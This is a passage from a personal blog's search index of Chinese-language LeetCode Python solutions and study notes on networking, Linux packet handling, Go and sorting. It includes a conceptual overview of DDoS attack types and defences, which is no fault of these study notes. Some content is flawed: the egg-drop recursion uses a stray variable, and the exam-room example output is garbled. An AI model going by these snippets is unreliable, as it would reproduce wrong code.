pat.items()} return min(tmp.values()) ","permalink":"https://littlebees.github.io/2021/09/leetcode-1189-maximum-number-of-balloons/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e","title":"leetcode-1189 - Maximum Number of Balloons"},{"content":"動機 題目寫得很爛，但題目本身很有趣!!\n題目想做的事是把string的括號分成兩組，讓兩組的深度越小越好 回傳每個括號是分配到哪一組\nProblem A string is a valid parentheses string (denoted VPS) if and only if it consists of \"(\" and \")\" characters only, and:\nIt is the empty string, orIt can be written as AB (A concatenated with B), where A and B are VPS's, orIt can be written as (A), where A is a VPS.We can similarly define the nesting depth depth(S) of any VPS S as follows:\ndepth(\"\") = 0depth(A + B) = max(depth(A), depth(B)), where A and B are VPS'sdepth(\"(\" + A + \")\") = 1 + depth(A), where A is a VPS.For example, \"\", \"()()\", and \"()(()())\" are VPS's (with nesting depths 0, 1, and 2), and \")(\" and \"(()\" are not VPS's.\nGiven a VPS seq, split it into two disjoint subsequences A and B, such that A and B are VPS's (and A.length + B.length = seq.length).\nNow choose any such A and B such that max(depth(A), depth(B)) is the minimum possible value.\nReturn an answer array (of length seq.length) that encodes such a choice of A and B: answer[i] = 0 if seq[i] is part of A, else answer[i] = 1. Note that even though multiple answers may exist, you may return any of them.\nExample 1:\nInput: seq = \"(()())\"Output: [0,1,1,1,1,0]Example 2:\nInput: seq = \"()(())()\"Output: [0,0,0,1,1,0,1,1] Constraints:\n1 \u003c= seq.size \u003c= 10000 Sol 就是把括號分成兩半，依據深度!!\nclass Solution: def maxDepthAfterSplit(self, seq: str) -\u0026gt; List[int]: ret = [] d = 0 for c in seq: left = (c == \u0026#34;(\u0026#34;) if left: d += 1 ret += int(d % 2 == 0), if not left: d -= 1 return ret ","permalink":"https://littlebees.github.io/2021/09/leetcode-1111-maximum-nesting-depth-of-two-valid-parentheses-strings/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e題目寫得很爛，但題目本身很有趣!!\u003c/p\u003e\n\u003cp\u003e題目想做的事是把string的括號分成兩組，讓兩組的深度越小越好\n回傳每個括號是分配到哪一組\u003c/p\u003e","title":"leetcode-1111 - Maximum Nesting Depth of Two Valid Parentheses Strings"},{"content":"動機 就很直接，沒有什麼魔法\nProblem There is an exam room with n seats in a single row labeled from 0 to n - 1.\nWhen a student enters the room, they must sit in the seat that maximizes the distance to the closest person. If there are multiple such seats, they sit in the seat with the lowest number. If no one is in the room, then the student sits at seat number 0.\nDesign a class that simulates the mentioned exam room.\nImplement the ExamRoom class:\nExamRoom(int n) Initializes the object of the exam room with the number of the seats n.int seat() Returns the label of the seat at which the next student will set.void leave(int p) Indicates that the student sitting at seat p will leave the room. It is guaranteed that there will be a student sitting at seat p. Example 1:\nInput[\"ExamRoom\", \"seat\", \"seat\", \"seat\", \"seat\", \"leave\", \"seat\"][[10], [], [], [], [], [4], []]Output[Algorithm, Leetcode, 0, 9, 4, 2, null, 5]ExplanationExamRoom examRoom = new ExamRoom(10);examRoom.seat(); // return 0, no one is in the room, then the student sits at seat number 0.examRoom.seat(); // return 9, the student sits at the last seat number 9.examRoom.seat(); // return 4, the student sits at the last seat number 4.examRoom.seat(); // return 2, the student sits at the last seat number 2.examRoom.leave(4);examRoom.seat(); // return 5, the student sits at the last seat number 5. Constraints:\n1 \u003c= n \u003c= 109It is guaranteed that there is a student sitting at seat p.At most 104 calls will be made to seat and leave. Sol 每次就是看要插入的點與前一個點的距離，找最大的\n但要注意，最後有一個N的位置要看\nfrom sortedcontainers import SortedList class ExamRoom: def __init__(self, n: int): self.l = SortedList() self.n = n def seat(self) -\u0026gt; int: if len(self.l) == 0: ret = 0 else: d = self.l[0] # 到前一個位置的距離 ret = 0 for a,b in zip(self.l, self.l[1:]): if (b-a)//2 \u0026gt; d: ret = (a+b)//2 d = (b-a)//2 if self.n-1-self.l[-1] \u0026gt; d: ret = self.n-1 self.l.add(ret) return ret def leave(self, p: int) -\u0026gt; None: self.l.remove(p) ","permalink":"https://littlebees.github.io/2021/09/leetcode-855-exam-room/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就很直接，沒有什麼魔法\u003c/p\u003e","title":"leetcode-855 - Exam Room"},{"content":"動機 十分的哭，1 \u0026lt;= n \u0026lt;= 10^9 會不會太大\nProblem A cinema has n rows of seats, numbered from 1 to n and there are ten seats in each row, labelled from 1 to 10 as shown in the figure above.\nGiven the array reservedSeats containing the numbers of seats already reserved, for example, reservedSeats[i] = [3,8] means the seat located in row 3 and labelled with 8 is already reserved.\nReturn the maximum number of four-person groups you can assign on the cinema seats. A four-person group occupies four adjacent seats in one single row. Seats across an aisle (such as [3,3] and [3,4]) are not considered to be adjacent, but there is an exceptional case on which an aisle split a four-person group, in that case, the aisle split a four-person group in the middle, which means to have two people on each side.\nExample 1:\nInput: n = 3, reservedSeats = [[1,2],[1,3],[1,8],[2,6],[3,1],[3,10]]Output: 4Explanation: The figure above shows the optimal allocation for four groups, where seats mark with blue are already reserved and contiguous seats mark with orange are for one group.Example 2:\nInput: n = 2, reservedSeats = [[2,1],[1,8],[2,6]]Output: 2Example 3:\nInput: n = 4, reservedSeats = [[4,3],[1,4],[4,6],[1,7]]Output: 4 Constraints:\n1 \u003c= n \u003c= 10^91 \u003c= reservedSeats.length \u003c= min(10*n, 10^4)reservedSeats[i].length == 21 \u003c= reservedSeats[i][0] \u003c= n1 \u003c= reservedSeats[i][1] \u003c= 10All reservedSeats[i] are distinct. Sol 因為太大，所以不能把所以資料一次讀進來，不然記憶體會爆\n所以，要一筆一筆的讀，我們只看有劃位的部分，剩下一定是2組\nclass Solution: def maxNumberOfFamilies(self, n: int, reservedSeats: List[List[int]]) -\u0026gt; int: center = int(\u0026#39;0001111000\u0026#39;,2) left = int(\u0026#39;0111100000\u0026#39;,2) right = int(\u0026#39;0000011110\u0026#39;,2) def avail4(avail): isLeft = (avail \u0026amp; left == left) isRight = (avail \u0026amp; right == right) isCenter = (avail \u0026amp; center == center) if isLeft and isRight: return 2 elif isLeft or isRight or isCenter: return 1 else: return 0 seats = int(\u0026#39;1111111111\u0026#39;, 2) avails = defaultdict(lambda : seats) for s,i in reservedSeats: avails[s] = avails[s] \u0026amp; ~(1 \u0026lt;\u0026lt; (i-1)) return 2*(n-len(avails))+sum(avail4(avail) for avail in avails.values()) ","permalink":"https://littlebees.github.io/2021/09/leetcode-1386-cinema-seat-allocation/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e十分的哭，\u003ccode\u003e1 \u0026lt;= n \u0026lt;= 10^9\u003c/code\u003e\n會不會太大\u003c/p\u003e","title":"leetcode-1386 - Cinema Seat Allocation"},{"content":"動機 有可以直接求的dp但是很難懂\nProblem You are given k identical eggs and you have access to a building with n floors labeled from 1 to n.\nYou know that there exists a floor f where 0 \u003c= f \u003c= n such that any egg dropped at a floor higher than f will break, and any egg dropped at or below floor f will not break.\nEach move, you may take an unbroken egg and drop it from any floor x (where 1 \u003c= x \u003c= n). If the egg breaks, you can no longer use it. However, if the egg does not break, you may reuse it in future moves.\nReturn the minimum number of moves that you need to determine with certainty what the value of f is.\nExample 1:\nInput: k = 1, n = 2Output: 2Explanation: Drop the egg from floor 1. If it breaks, we know that f = 0.Otherwise, drop the egg from floor 2. If it breaks, we know that f = 1.If it does not break, then we know f = 2.Hence, we need at minimum 2 moves to determine with certainty what the value of f is.Example 2:\nInput: k = 2, n = 6Output: 3Example 3:\nInput: k = 3, n = 14Output: 4 Constraints:\n1 \u003c= k \u003c= 1001 \u003c= n \u003c= 104 Sol dp(n,k)是k個蛋與試n次，可以驗證到最多幾層樓\nclass Solution: def superEggDrop(self, k: int, n: int) -\u0026gt; int: @cache def f(n,k): if k == 1: return n elif n == 1: return 1 else: return f(n-1,k-1)+f(n-1,j)+1 for i in range(1,n+1): for j in range(1,k+1): if f(i,j) \u0026gt;= n: return i ","permalink":"https://littlebees.github.io/2021/09/leetcode-887-super-egg-drop/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e有可以直接求的dp但是很難懂\u003c/p\u003e","title":"leetcode-887 - Super Egg Drop"},{"content":"動機 0~n就是loop!!\nProblem You are given an integer array nums of length n where nums is a permutation of the numbers in the range [0, n - 1].\nYou should build a set s[k] = {nums[k], nums[nums[k]], nums[nums[nums[k]]], ... } subjected to the following rule:\nThe first element in s[k] starts with the selection of the element nums[k] of index = k.The next element in s[k] should be nums[nums[k]], and then nums[nums[nums[k]]], and so on.We stop adding right before a duplicate element occurs in s[k].Return the longest length of a set s[k].\nExample 1:\nInput: nums = [5,4,0,3,1,6,2]Output: 4Explanation: nums[0] = 5, nums[1] = 4, nums[2] = 0, nums[3] = 3, nums[4] = 1, nums[5] = 6, nums[6] = 2.One of the longest sets s[k]:s[0] = {nums[0], nums[5], nums[6], nums[2]} = {5, 6, 2, 0}Example 2:\nInput: nums = [0,1,2]Output: 1 Constraints:\n1 \u003c= nums.length \u003c= 1050 \u003c= nums[i] \u003c nums.lengthAll the values of nums are unique. Sol 只要是排序就是會有各種loop，所以用dfs去求loop長度就好\nclass Solution: def arrayNesting(self, nums: List[int]) -\u0026gt; int: def dfs(i): if i == -1: return -1 else: j, nums[i] = nums[i], -1 return 1+dfs(j) return max([dfs(i) for i in range(len(nums))]) ","permalink":"https://littlebees.github.io/2021/09/leetcode-565-array-nesting/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e0~n就是loop!!\u003c/p\u003e","title":"leetcode-565 - Array Nesting"},{"content":"動機 看解答推導看不懂，看lee215一下就懂了，真是神!!\n另外這題很漂亮、很美!!\nProblem There is an undirected connected tree with n nodes labeled from 0 to n - 1 and n - 1 edges.\nYou are given the integer n and the array edges where edges[i] = [ai, bi] indicates that there is an edge between nodes ai and bi in the tree.\nReturn an array answer of length n where answer[i] is the sum of the distances between the ith node in the tree and all other nodes.\nExample 1:\nInput: n = 6, edges = [[0,1],[0,2],[2,3],[2,4],[2,5]]Output: [8,12,6,10,10,10]Explanation: The tree is shown above.We can see that dist(0,1) + dist(0,2) + dist(0,3) + dist(0,4) + dist(0,5)equals 1 + 1 + 2 + 2 + 2 = 8.Hence, answer[0] = 8, and so on.Example 2:\nInput: n = 1, edges = []Output: [0]Example 3:\nInput: n = 2, edges = [[1,0]]Output: [1,1] Constraints:\n1 \u003c= n \u003c= 3 * 104edges.length == n - 1edges[i].length == 20 \u003c= ai, bi \u003c nai != biThe given input represents a valid tree. Sol 求根的距離和很簡單 ret[now] += count[x]+ret[x]\ncount[x]是x為根的node總個數\n所以上面的ret的意思是新加一個點就會延長每個點的距離1步\n這樣可以求出ret[root]，那其他點呢? 可以看成root移動，每次移動一格，就會有靠近的與遠離的 也就是，有node的距離變短，有的變長，所以 ret[x] = ret[parent] - count[x] + (N-count[x])\nclass Solution: def sumOfDistancesInTree(self, n: int, edges: List[List[int]]) -\u0026gt; List[int]: count = [1] * n ret = [0] * n gh = defaultdict(list) for a,b in edges: gh[a].append(b) gh[b].append(a) def post(now, prev): for x in gh[now]: if x != prev: post(x,now) count[now] += count[x] ret[now] += count[x]+ret[x] def pre(now, prev): for x in gh[now]: if x != prev: ret[x] = ret[now] - count[x] + n - count[x] pre(x,now) post(0,None) # ret[0] is correct, other will not include parent part!! pre(0,None) # fix ret[i] from ret[0] return ret ","permalink":"https://littlebees.github.io/2021/09/leetcode-834-sum-of-distances-in-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e看解答推導看不懂，看lee215一下就懂了，真是神!!\u003c/p\u003e\n\u003cp\u003e另外這題很漂亮、很美!!\u003c/p\u003e","title":"leetcode-834 - Sum of Distances in Tree"},{"content":"動機 我們要搜尋，所以一個要上升一個要下降 lis與一個要上升一個要下降的關係是? Problem A ramp in an integer array nums is a pair (i, j) for which i \u003c j and nums[i] \u003c= nums[j]. The width of such a ramp is j - i.\nGiven an integer array nums, return the maximum width of a ramp in nums. If there is no ramp in nums, return 0.\nExample 1:\nInput: nums = [6,0,8,2,1,5]Output: 4Explanation: The maximum width ramp is achieved at (i, j) = (1, 5): nums[1] = 0 and nums[5] = 5.Example 2:\nInput: nums = [9,8,1,0,1,9,4,0,4,1]Output: 7Explanation: The maximum width ramp is achieved at (i, j) = (2, 9): nums[2] = 1 and nums[9] = 1. Constraints:\n2 \u003c= nums.length \u003c= 5 * 1040 \u003c= nums[i] \u003c= 5 * 104 Sol 有構成ramp有兩個條件\ni \u0026lt; j nums[i] \u0026lt;= nums[j] 而現在我們要搜尋，所以一個要上升一個要下降，很像two pointer的2 sum\nclass Solution: def maxWidthRamp(self, nums: List[int]) -\u0026gt; int: stk = [] # index increasing, val decreasing for i in range(len(nums)): if not stk or nums[stk[-1]] \u0026gt; nums[i]: stk += i, ret = 0 for i in range(len(nums)-1,-1,-1): while stk and nums[stk[-1]] \u0026lt;= nums[i]: ret = max(ret, i-stk.pop()) return ret 也可以做lis\nclass Solution: def maxWidthRamp(self, nums: List[int]) -\u0026gt; int: stk = [] ret = 0 for i in range(len(nums)-1,-1,-1): n = nums[i] # index decreasing, val increasing if not stk or stk[-1][0] \u0026lt; n: stk += [n,i], else: j = stk[bisect.bisect(stk,[n,i])][1] ret = max(ret, j-i) return ret ","permalink":"https://littlebees.github.io/2021/09/leetcode-962-maximum-width-ramp/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e我們要搜尋，所以一個要上升一個要下降\u003c/li\u003e\n\u003cli\u003elis與\u003cem\u003e一個要上升一個要下降\u003c/em\u003e的關係是?\u003c/li\u003e\n\u003c/ul\u003e","title":"leetcode-962 - Maximum Width Ramp"},{"content":"動機 有趣的topic\npath of pkt: 從下到上 總路線簡化版 PHY dma 到 kernel ring buffer (1st copy) Nic發signal data link Kernel handler到上半部處理 註冊 device與下半部handler 下半部 取skb 從ring buffer到qdisc 決定往哪一個地方送 (bridge,ip) ip Ip 會照這圖先到preroute hook route (from static, routing protocol, 自動生出來的) 自己要收, output (local in與local out的hook) Forward (forward的hook) 往下之前看要不要切片 把mac填好 (arp或是neighbour) tcp 往上找有沒有開的socket 往prequeue 塞 等read，有就開始往userspace copy (2nd copy) 沒有就drop app Read做recvform的syscall再根據socket類型往下找對應的recvform skb netfilter與總路線 localhost怎麼處理? localhost是到lo interface，也就是假網卡，data直接灌給自己\n有趣的是，只要是本機ip與localhost到本機ip與localhost，不論routing怎麼設，都是過4與3層到lo!!\nRef Queueing in the Linux Network Stack linux network stack Netfilter-TaiwanWorkshop Linux Network Stack Walkthrough (2.4.20) 环回接口(loopback interface)的新认识\n","permalink":"https://littlebees.github.io/2021/09/packet%E5%9C%A8linux%E4%B8%AD%E8%B5%B0%E9%81%8E%E7%9A%84%E8%B7%AF/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e有趣的topic\u003c/p\u003e","title":"packet在linux中走過的路"},{"content":"動機 merge sort as a sorting framework merge sort其實不用分到最後一個才merge，merge時才sort是因為沒有其他手法，如果有其他sort?\n可以直接切成各個小list去sort，之後就是merge\nexternal merge sort 如果記憶體有限，可以把大檔案(list)，分成小檔案，把小檔案放到mem做一般的sort\n之後把記憶體分成\n放每個小檔案的sublist 各自的buffer為空時就往下讀 輸出merge結果的list 滿了就放到目標檔案 ","permalink":"https://littlebees.github.io/2021/09/external-sort/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e","title":"external sort"},{"content":"動機 promoted attr只是一種語法糖，不是繼承 (沒有subtype) promoted attr只是展開 把struct想成Let Over Lambda struct是value type interface就是看有沒有function promoted attr \u0026amp; 繼承 type a struct {} type b struct { a string } b展開了a與string，但這不代表b是a的subtype!! 只是沒有name的欄位\n所以a還是a，b還是b\n但正如promoted attr，golang提供語法糖，promoted method，讓使用者以為有繼承\npointer type type a struct {} var x a var y *a x與y的type不同，如果是java或是python只有*a\nmethod \u0026amp; interface type a interface { f1() } type struct x {} func (_ x) f1() {} //var g *a //g = \u0026amp;x{} var g a g = x{} // g = \u0026amp;x{} 上面只有x有實作a，但是*x沒有!!\ntype a interface { f1() } type struct x {} func (_ *x) f1() {} var g a g = \u0026amp;x{} 另外注意就算是物件指標，還是a，不是*a\ntemplate method pattern type Iface { f1() f2() } type struct a { x int } type struct b { x float64 } func (this *a) f1() { fmt.Println(this.x) this.f2() } func (this *a) f2() { fmt.Println(123) } func (this *b) f1() { this.f2() fmt.Println(this.x) } func (this *b) f2() { fmt.Println(234) } func template(f Iface, val int) { fmt.Println(val) f.f1() f.f2() } 我google到的template method需要生struct，在裡面放實作iface的struct，十分繞\n倒不如把struct當成lambda的第一層(let)，之後的method當成大二層lambda\n(define (a x) (lambda () ...)) ","permalink":"https://littlebees.github.io/2021/08/golang%E8%88%87%E7%B9%BC%E6%89%BF%E8%88%87template-method-pattern/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003epromoted attr只是一種語法糖，不是繼承 (沒有subtype)\u003c/li\u003e\n\u003cli\u003epromoted attr只是展開\u003c/li\u003e\n\u003cli\u003e把struct想成Let Over Lambda\u003c/li\u003e\n\u003cli\u003estruct是value type\u003c/li\u003e\n\u003cli\u003einterface就是看有沒有function\u003c/li\u003e\n\u003c/ol\u003e","title":"golang與繼承與template method pattern"},{"content":"動機 如果兩點在對角線上x,y軸的差值會一樣!!\nProblem The n-queens puzzle is the problem of placing n queens on an n x n chessboard such that no two queens attack each other.\nGiven an integer n, return the number of distinct solutions to the n-queens puzzle.\nExample 1:\nInput: n = 4Output: 2Explanation: There are two distinct solutions to the 4-queens puzzle as shown.Example 2:\nInput: n = 1Output: 1 Constraints:\n1 \u003c= n \u003c= 9 Sol 如果兩點在對角線上x,y軸的差值會一樣\n利用上面這一點，可以用n驗證有沒有攻擊\nclass Solution: def totalNQueens(self, n: int) -\u0026gt; int: def good(taken, j): return not any([abs(taken[dep] - j) in [0, len(taken)-dep] for dep in range(len(taken))]) def bt(i,taken=[]): if i == n: return 1 else: ret = 0 for x in range(n): if good(taken, x): ret += bt(i+1, taken+[x]) return ret return bt(0) ","permalink":"https://littlebees.github.io/2021/08/leetcode-52-n-queens-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e如果兩點在對角線上x,y軸的差值會一樣!!\u003c/p\u003e","title":"leetcode-52 - N-Queens II"},{"content":"動機 top-down: 好寫、但沒有過去的訊息 bottom-up: 不好寫、有過去的訊息 (bsearch!!)、很好做求到此點最大的題目\nProblem We have n jobs, where every job is scheduled to be done from startTime[i] to endTime[i], obtaining a profit of profit[i].\nYou're given the startTime, endTime and profit arrays, return the maximum profit you can take such that there are no two jobs in the subset with overlapping time range.\nIf you choose a job that ends at time X you will be able to start another job that starts at time X.\nExample 1:\nInput: startTime = [1,2,3,3], endTime = [3,4,5,6], profit = [50,10,40,70]Output: 120Explanation: The subset chosen is the first and fourth job. Time range [1-3]+[3-6] , we get profit of 120 = 50 + 70.Example 2:\nInput: startTime = [1,2,3,4,6], endTime = [3,5,10,6,9], profit = [20,20,100,70,60]Output: 150Explanation: The subset chosen is the first, fourth and fifth job. Profit obtained 150 = 20 + 70 + 60.Example 3:\nInput: startTime = [1,1,1], endTime = [2,3,4], profit = [5,6,4]Output: 6 Constraints:\n1 \u003c= startTime.length == endTime.length == profit.length \u003c= 5 * 1041 \u003c= startTime[i] \u003c endTime[i] \u003c= 1091 \u003c= profit[i] \u003c= 104 Sol 從哪個點開始延伸? 最靠近起點的點，所以找起點加1的lowerbound\nclass Solution: def jobScheduling(self, startTime: List[int], endTime: List[int], profit: List[int]) -\u0026gt; int: segs = list(zip(startTime, endTime, profit)) segs.sort(key=lambda x: [x[1], x[2], x[0]]) dp = [[0,0]] for s,e,p in segs: i = bisect.bisect_left(dp, [s+1])-1 if dp[i][1]+p \u0026gt;= dp[-1][1]: dp += [e,dp[i][1]+p], return dp[-1][1] ","permalink":"https://littlebees.github.io/2021/08/leetcode-1235-maximum-profit-in-job-scheduling/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003etop-down: 好寫、但沒有過去的訊息\nbottom-up: 不好寫、有過去的訊息 (bsearch!!)、很好做求到此點最大的題目\u003c/p\u003e","title":"leetcode-1235 - Maximum Profit in Job Scheduling"},{"content":"動機 就是硬幹 但isSubsequence很神，原來iterator可以這麼用\n用iterator比對時，沒比對到就會iterator往下，比對到就停 Problem Given an array of strings strs, return the length of the longest uncommon subsequence between them. If the longest uncommon subsequence does not exist, return -1.\nAn uncommon subsequence between an array of strings is a string that is a subsequence of one string but not the others.\nA subsequence of a string s is a string that can be obtained after deleting any number of characters from s.\nFor example, \"abc\" is a subsequence of \"aebdc\" because you can delete the underlined characters in \"aebdc\" to get \"abc\". Other subsequences of \"aebdc\" include \"aebdc\", \"aeb\", and \"\" (empty string). Example 1:\nInput: strs = [\"aba\",\"cdc\",\"eae\"]Output: 3Example 2:\nInput: strs = [\"aaa\",\"aaa\",\"aa\"]Output: -1 Constraints:\n1 \u003c= strs.length \u003c= 501 \u003c= strs[i].length \u003c= 10strs[i] consists of lowercase English letters. Sol 用iterator比對時，沒比對到就會iterator往下，比對到就停\nclass Solution: def findLUSlength(self, words): def isSubsequence(s, t): t = iter(t) return all(c in t for c in s) words.sort(key = lambda x:-len(x)) for i, word in enumerate(words): if all(not isSubsequence(word, words[j]) for j in range(len(words)) if j != i): return len(word) return -1 ","permalink":"https://littlebees.github.io/2021/08/leetcode-522-longest-uncommon-subsequence-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就是硬幹\n但isSubsequence很神，原來iterator可以這麼用\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e用iterator比對時，沒比對到就會iterator往下，比對到就停\u003c/li\u003e\n\u003c/ul\u003e","title":"leetcode-522 - Longest Uncommon Subsequence II"},{"content":"動機 如果有機會面試，我就出這題\nProblem Given two strings a and b, return the length of the longest uncommon subsequence between a and b. If the longest uncommon subsequence does not exist, return -1.\nAn uncommon subsequence between two strings is a string that is a subsequence of one but not the other.\nA subsequence of a string s is a string that can be obtained after deleting any number of characters from s.\nFor example, \"abc\" is a subsequence of \"aebdc\" because you can delete the underlined characters in \"aebdc\" to get \"abc\". Other subsequences of \"aebdc\" include \"aebdc\", \"aeb\", and \"\" (empty string). Example 1:\nInput: a = \"aba\", b = \"cdc\"Output: 3Explanation: One longest uncommon subsequence is \"aba\" because \"aba\" is a subsequence of \"aba\" but not \"cdc\".Note that \"cdc\" is also a longest uncommon subsequence.Example 2:\nInput: a = \"aaa\", b = \"bbb\"Output: 3Explanation: The longest uncommon subsequences are \"aaa\" and \"bbb\".Example 3:\nInput: a = \"aaa\", b = \"aaa\"Output: -1Explanation: Every subsequence of string a is also a subsequence of string b. Similarly, every subsequence of string b is also a subsequence of string a. Constraints:\n1 \u003c= a.length, b.length \u003c= 100a and b consist of lower-case English letters. Sol Longest Uncommon Subsequence的重點是最長一定是單字本身\nclass Solution: def findLUSlength(self, a: str, b: str) -\u0026gt; int: if a == b: return -1 else: return max(len(a),len(b)) ","permalink":"https://littlebees.github.io/2021/08/leetcode-521-longest-uncommon-subsequence-i/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e如果有機會面試，我就出這題\u003c/p\u003e","title":"leetcode-521 - Longest Uncommon Subsequence I"},{"content":"動機 OSI 7 layers HTTP keep-alive: 當客戶端傳送另一個請求時，它會使用同一個連接 Idempotence: 只有POST不是Idempotence POST可以看成create資源 DNS string 2 IP iterative \u0026amp; recursive DHCP DHCP Discover DHCP Offer DHCP Request DHCP ACK transport for application TCP (data header) sport, dport seq, ack connection oriented flow control receive window ack, ack, \u0026hellip; , seq,seq \u0026hellip; sending window seq, seq, \u0026hellip;, wait, wait, \u0026hellip; wait, \u0026hellip; (not in window) 每個出去的pkt會有timer timeout會retransmit 控制sending window的長度就是flow control receiver會通知rwnd的大小 error control checksum ack 下一個要的seq 確認號 為 所收到區段的 最後一個 位元組之 序號 + 1 Delayed ACK 累積多一點ack retransmit delay, lost, damaged pkt fast retransmit receiver: out-of-order pkt sender: 收到3個重複的ack 不等timer直接retransmit congestion control Loss-based 如果retransmit發生就調cwnd bufferbloat 大家的buffer都很大 pkt都待在queue tcp以為沒有congestion 狂丟pkt到網路上 sending window = min(RCV.rwnd, cwnd) cwnd怎麼長 slow start 指數成長 總不能一直漲 Slow Start Threshold packet loss Congestion Avoidance 線性的長 Fast Recovery fast retransmit後到這個狀態 等看是retransmit還是packet loss split packet UDP IP for WAN (data header) IP header不會變!! match 中 直接過去 沒中 default gateway how to match CIDR、netmask (IP_A \u0026amp; netmask) == (IP_B \u0026amp; netmask) net addr \u0026amp; host addr table from RIP broacast routing table for 30 secs use metrics to decide to use which ip as dest IP 2 MAC \u0026amp; MAC 2 IP ARP ARP spoofing RARP data link for LAN ethernet (FCS data header) CSMA/CD 傳送特殊阻塞資訊並立即停止傳送資料 固定時間（一開始是1 contention period times）內等待隨機的時間，再次傳送 若依舊碰撞，則採用截斷二進位指數避退演算法進行傳送。即十次之內停止前一次「固定時間」的兩倍時間內隨機再發送 phy cable VPN tunnel tunnels are a method for transporting data across a network using protocols that are not supported by that network. Tunneling works by encapsulating packets: wrapping packets inside of other packets. IPsec level 3 2個東西 SA IPsec的參數 封包模式 transport 用原本的header，加入驗證的資料 tunnel 造一個新的header 安全協定 AH 驗證header有沒有被改 host 2 host ESP 把原pkt加密，再封裝 所以可以過NAT network 2 network 加密演算法 PKI 公私鑰 驗證身分用 The purpose of IPsec is to give the remote computer direct access to the central network, making it a full member TLS level 4 建連線時交換加密法與憑證，生成加密連線 Security is maintained by restricting access to only what’s needed. portal mode can only be used for web-based programs tunnel mode users can access any applications on the network, including ones that are not web based scenario: Ping 如果是string會先過DNS換ip 生ICMP echo 建連線，udp socket 填sport與dport，包udp header 填sip與dip，包ip header dip放到routing table比，看要往哪一台機器丟 找到dest，用arp換mac 填smac與dmac，包eth header 往下，到phy router解eth header，確認是自己要收，驗FCS router看ip header，對table，arp，包eth header 終點就是反著做一次 scenario: Browser 差在tcp tcp start 3 handshake SYN -\u0026gt; ACK與SYN \u0026lt;- ACK -\u0026gt; slow start \u0026amp; rwnd\u0026hellip; tcp end 4 close FIN -\u0026gt; FIN_WAIT, CLOSE_WAIT ACK \u0026lt;- FIN_WAIT, CLOSE_WAIT FIN \u0026lt;- TIME_WAIT, LAST_ACK ACK -\u0026gt; (wait a while) CLOSED, CLOSED explain DDoS 目的 利用大量的互聯網流量使目標伺服器或其周圍的基礎設施不堪重負，從而阻斷目標伺服器、服務或網路的正常流量 跡象 大量流量 from 同一ip, 同一ip範圍 單一行為特徵（例如設備類型、地理位置或 Web 瀏覽器版本）的用戶 對單一頁面或端點的請求 奇怪的流量模式，如在非正常時段激增，或不自然的模式 攻擊方式 level 7 HTTP 洪水: req同一個網頁 DNS放大: 假的sip去dns query level 4 SYN 洪水: 假的sip去建連線 level 3 ping of death 在當時，大部分電腦無法處理大於IPv4最大封包大小（65,535位元組）的ping封包。 因此發送這樣大小的ping可以令目標電腦崩潰。 buffer overflow 防禦手法 黑洞路由 Rate Limiting Web Application Firewall 反向 Proxy，可使客戶在到達伺服器前通過 WAF load balance 自動分配新進來的請求要導到哪一台 Server level 3 分散到各個主機 ECMP level 7 application load balancer (from aws) 分散到group persistence 依據session打散到server affinity 如果把seesion共用，就能 依據busy程度分配load logic trick?? 邏輯問題 找不同重量的球\n8顆球，其中1顆撞球比其他顆重了一點，幾次能找到 兩次 先將所有的撞球平分成三坨：3、3、2 先比3,3，後面就很好想了 一個5公升和3公升的瓶子，請量出4公升的水量\n5 -\u0026gt; 3 5 剩下 2 5(2) -\u0026gt; 3 3 剩下 1的空間 5 -\u0026gt; 3(2) 最後是4 醫生給了患者4顆共2種的藥，但他們彼此從外觀並不能分出差別，早上和晚上都得兩種各服一顆\n如果他沒按時吃或吃錯的話就會死，結果他不小心把藥搞混了，那他該怎麼做才能分辨哪個是正確的 那就是把藥全部都切成一半，但是這一半不能再混在一起，早上把其中一半吃掉，晚上再吃另一半就好 桌子的抽屜裏有如下16張撲克牌:\n紅心 A、Q、4 黑桃 J、8、4、2、7、3 梅花 K、Q、5、4、6 方塊 A、5 把這張牌的點數告訴P先生，把這張牌的花色告訴Q先生 P先生：\u0026ldquo;我不知道這張牌。\u0026rdquo; 數字重複: A、Q、4、5 Q先生：\u0026ldquo;我知道你不知道這張牌。\u0026rdquo; 花色中的數字都是重複的: 紅心、方塊 P先生：\u0026ldquo;現在我知道這張牌了。\u0026rdquo; 數字唯一: 方塊5 Q先生：\u0026ldquo;我也知道了。 花色中的數字唯一: 方塊5 DS implementation circular queue class CircularQueue(): def __init__(self, size): # initializing the class self.size = size self.queue = [None for i in range(size)] self.front = self.rear = -1 def enqueue(self, data): if ((self.rear + 1) % self.size == self.front): print(\u0026#34; Queue is Full\\n\u0026#34;) # condition for empty queue elif (self.front == -1): self.front = 0 self.rear = 0 self.queue[self.rear] = data else: self.rear = (self.rear + 1) % self.size self.queue[self.rear] = data def dequeue(self): if (self.front == -1): # condition for empty queue print (\u0026#34;Queue is Empty\\n\u0026#34;) # condition for only one element elif (self.front == self.rear): temp=self.queue[self.front] self.front = -1 self.rear = -1 return temp else: temp = self.queue[self.front] self.front = (self.front + 1) % self.size return temp stack in linked list push/pop在head def push(head,val): ret = Node(val) ret.next = head return ret def pop(head): if head: return [head.val, head.next] else: raise 